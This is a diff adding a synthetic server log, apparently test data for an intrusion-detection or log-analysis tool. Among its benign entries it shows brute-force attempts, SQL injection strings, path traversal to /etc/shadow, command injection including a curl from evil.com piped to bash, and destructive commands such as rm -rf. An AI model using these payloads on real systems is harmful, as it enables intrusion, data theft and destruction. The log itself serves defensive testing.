@@ -1,0 +1,47 @@
+[2026-09-01 08:00:01] INFO auth.server LOGIN_SUCCESS admin 192.168.1.10 user=admin login successful
+[2026-09-01 08:00:05] INFO web.server REQUEST admin 192.168.1.10 GET /dashboard
+[2026-09-01 08:01:00] WARNING auth.server LOGIN_FAIL unknown 203.0.113.50 user=admin password incorrect attempt 1
+[2026-09-01 08:01:03] WARNING auth.server LOGIN_FAIL unknown 203.0.113.50 user=admin password incorrect attempt 2
+[2026-09-01 08:01:06] WARNING auth.server LOGIN_FAIL unknown 203.0.113.50 user=admin password incorrect attempt 3
+[2026-09-01 08:01:09] WARNING auth.server LOGIN_FAIL unknown 203.0.113.50 user=admin password incorrect attempt 4
+[2026-09-01 08:01:12] WARNING auth.server LOGIN_FAIL unknown 203.0.113.50 user=admin password incorrect attempt 5
+[2026-09-01 08:01:15] WARNING auth.server LOGIN_FAIL unknown 203.0.113.50 user=admin password incorrect attempt 6
+[2026-09-01 08:05:00] INFO auth.server LOGIN_SUCCESS operator 192.168.1.20 user=operator login successful
+[2026-09-01 08:05:30] WARNING auth.server LOGIN_FAIL unknown 198.51.100.23 user=root password incorrect attempt 1
+[2026-09-01 08:05:33] WARNING auth.server LOGIN_FAIL unknown 198.51.100.23 user=root password incorrect attempt 2
+[2026-09-01 08:05:36] WARNING auth.server LOGIN_FAIL unknown 198.51.100.23 user=root password incorrect attempt 3
+[2026-09-01 08:10:00] INFO web.server ACCESS_SENSITIVE admin 192.168.1.10 GET /etc/passwd sensitive file access
+[2026-09-01 08:10:05] INFO web.server ACCESS_SENSITIVE admin 192.168.1.10 GET /etc/shadow sensitive file access
+[2026-09-01 08:10:10] INFO web.server ACCESS_SENSITIVE admin 192.168.1.10 GET /etc/hosts sensitive file access
+[2026-09-01 08:10:15] INFO web.server ACCESS_SENSITIVE admin 192.168.1.10 GET /var/log/auth.log sensitive file access
+[2026-09-01 08:15:00] CRITICAL web.server REQUEST attacker 45.33.32.156 GET /api/search?q=UNION SELECT username,password FROM users--
+[2026-09-01 08:15:05] CRITICAL web.server REQUEST attacker 45.33.32.156 POST /api/login user=' OR 1=1--
+[2026-09-01 08:20:00] CRITICAL shell.server EXECUTE admin 192.168.1.10 sudo rm -rf /important_data
+[2026-09-01 08:20:05] CRITICAL shell.server EXECUTE admin 192.168.1.10 chmod 777 /etc/passwd
+[2026-09-01 08:25:00] CRITICAL web.server REQUEST scanner 10.0.0.55 GET /admin/../../../etc/shadow
+[2026-09-01 08:25:03] CRITICAL web.server REQUEST scanner 10.0.0.55 GET /admin/../../../etc/passwd
+[2026-09-01 08:30:00] INFO web.server REQUEST user1 192.168.1.50 GET /api/data geo=unknown
+[2026-09-01 08:30:05] INFO auth.server LOGIN_SUCCESS user1 192.168.1.50 TOR_EXIT node detected
+[2026-09-01 08:30:10] WARNING web.server ACCESS_DENIED user1 192.168.1.50 GET /admin panel access denied
+[2026-09-01 08:35:00] CRITICAL web.server REQUEST unknown 192.0.2.1 GET /api/exec?cmd=`cat /etc/passwd`
+[2026-09-01 08:35:05] CRITICAL web.server REQUEST unknown 192.0.2.1 GET /api/exec?cmd=$(whoami)
+[2026-09-01 08:35:10] CRITICAL web.server REQUEST unknown 192.0.2.1 GET /api/exec?cmd=; curl http://evil.com/shell.sh | bash
+[2026-09-01 08:40:00] INFO network.server CONN_ATTEMPT scanner 10.0.0.55 port=22
+[2026-09-01 08:40:01] INFO network.server CONN_ATTEMPT scanner 10.0.0.55 port=80
+[2026-09-01 08:40:02] INFO network.server CONN_ATTEMPT scanner 10.0.0.55 port=443
+[2026-09-01 08:40:03] INFO network.server CONN_ATTEMPT scanner 10.0.0.55 port=3306
+[2026-09-01 08:40:04] INFO network.server CONN_ATTEMPT scanner 10.0.0.55 port=8080
+[2026-09-01 08:40:05] INFO network.server CONN_ATTEMPT scanner 10.0.0.55 port=8443
+[2026-09-01 08:40:06] INFO network.server CONN_ATTEMPT scanner 10.0.0.55 port=4444
+[2026-09-01 08:45:00] WARNING auth.server LOGIN_FAIL unknown 198.51.100.99 user=operator password incorrect attempt 1
+[2026-09-01 08:45:02] WARNING auth.server LOGIN_FAIL unknown 198.51.100.99 user=root password incorrect attempt 2
+[2026-09-01 08:45:04] WARNING auth.server LOGIN_FAIL unknown 198.51.100.99 user=admin password incorrect attempt 3
+[2026-09-01 08:45:06] WARNING auth.server LOGIN_FAIL unknown 198.51.100.99 user=svc password incorrect attempt 4
+[2026-09-01 08:45:08] WARNING auth.server LOGIN_FAIL unknown 198.51.100.99 user=nobody password incorrect attempt 5
+[2026-09-01 08:45:10] WARNING auth.server LOGIN_FAIL unknown 198.51.100.99 user=www-data password incorrect attempt 6
+[2026-09-01 08:50:00] CRITICAL web.server REQUEST pentester 172.16.0.100 GET /api/users?id=1 UNION SELECT id,username,password,role FROM users--
+[2026-09-01 08:50:05] CRITICAL web.server REQUEST pentester 172.16.0.100 POST /api/users body='; DROP TABLE users;--
+[2026-09-01 08:55:00] INFO web.server ACCESS_SENSITIVE admin 192.168.1.10 GET /var/log/syslog sensitive file access
+[2026-09-01 08:55:05] INFO web.server ACCESS_SENSITIVE admin 192.168.1.10 GET /var/log/secure sensitive file access
+[2026-09-01 08:55:10] INFO web.server ACCESS_SENSITIVE admin 192.168.1.10 GET /etc/sudoers sensitive file access
+[2026-09-01 08:55:15] INFO web.server ACCESS_SENSITIVE admin 192.168.1.10 GET /root/.ssh/authorized_keys sensitive file access
